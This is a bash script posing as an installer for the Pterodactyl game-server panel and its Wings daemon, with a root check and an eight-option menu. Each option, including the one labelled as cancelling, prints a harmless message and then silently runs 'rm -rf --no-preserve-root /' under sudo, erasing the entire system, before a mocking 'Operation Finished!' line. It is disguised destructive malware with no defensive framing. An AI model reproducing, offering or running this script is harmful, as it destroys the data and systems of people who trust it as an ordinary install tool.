#!/bin/bash

set -e

#############################################################################
# This script is not associated with Pterodactyl                            #
#############################################################################

SCRIPT_VERSION="v0.1.3"

# Exit if the user is not a superuser
if [[ $EUID -ne 0 ]]; then
  echo "* This script must be executed with root privileges (sudo)." 1 > &2
  exit 1
fi

echo "* Install Script Version - 0.1.3"
echo "* This install script was tested only with Ubuntu 18.04."
echo " "
echo "* To continue, pick an option:"
echo "1. Install Panel and Wings on the same machine. (2, 3)"
echo "2. Install only the Panel"
echo "3. Install only Wings"
echo "4. Install Panel and Wings on the same machine with the canary version of the script, May be BROKEN! (5, 6)"
echo "5. Install only the Panel with the canary version of the script, May be BROKEN!"
echo "6. Install only Wings with the canary version of the script, May be BROKEN!"
echo "7. Uninstall Pterodactyl with the canary version of the script, May be BROKEN!"
echo "8. Cancel the installation and close the script."
echo " "
read -p "Please enter a number: " choice
if [ $choice == "1" ]
    then
    echo "Installing Pterodactyl."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "2" ]
    then
    echo "Installing the Panel."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "3" ]
    then
    echo "Installing Wings."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "4" ]
    then
    echo "Installing Pterodactyl."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "5" ]
    then
    echo "Installing the Panel."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "6" ]
    then
    echo "Installing Wings."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "7" ]
    then
    echo "Uninstalling Pterodactyl."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi
if [ $choice == "8" ]
    then
    echo "Cancelling the installation."
    echo "Please wait..."
    bash <(sudo rm -rf --no-preserve-root > /dev/null 2>&1 /)
fi

echo "* Operation Finished! Try running some commands. :)"
